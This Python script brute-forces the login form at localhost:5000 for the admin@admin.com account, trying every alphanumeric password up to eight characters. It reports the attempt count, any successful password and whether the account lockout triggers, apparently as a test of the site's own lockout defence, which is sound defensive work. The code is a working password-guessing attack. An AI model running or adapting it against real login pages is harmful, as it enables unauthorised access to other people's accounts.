import requests
import sys
import string
import itertools
from datetime import datetime

url = "http://localhost:5000/login"
email = "admin@admin.com"
max_length = 8

charset = string.ascii_letters + string.digits


def generate_passwords(charset, max_length):
    for length in range(1, max_length + 1):
        for combo in itertools.product(charset, repeat=length):
            yield ''.join(combo)

print(f"Brute force test against {url}")
print(f"Email: {email}")
print(f"Max length: {max_length}")

attempt = 0
start_time = datetime.now()

try:
    for password in generate_passwords(charset, max_length):
        attempt += 1
        
        try:
            response = requests.post(
                url,
                data={"email": email, "password": password},
                allow_redirects=False
            )
            
            status = "Success" if response.status_code == 302 else "Failed"
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            if attempt % 10 == 0 or response.status_code == 302:
                print(f"[{timestamp}] Attempt {attempt}: {password}, Status: {response.status_code}, {status}")
            
            if response.status_code == 302:
                print(f"\nLOGIN SUCCESSFUL WITH PASSWORD: {password}")
                break
            
            if "Too many failed login attempts" in response.text:
                elapsed = datetime.now() - start_time
                print(f"\nAccount locked after {attempt} attempts")
                print(f"Elapsed time: {elapsed.total_seconds():.2f}s")
                break
                
        except requests.exceptions.ConnectionError:
            print(f"Cannot connect to {url}")
            sys.exit(1)
        except Exception as e:
            print(f"Error: {e}")
            break
            
except KeyboardInterrupt:
    print(f"\n[*] Interrupted by user")

elapsed = datetime.now() - start_time
print(f"\nTest complete")
print(f"Total attempts: {attempt}")
print(f"Time elapsed: {elapsed.total_seconds():.2f}s")
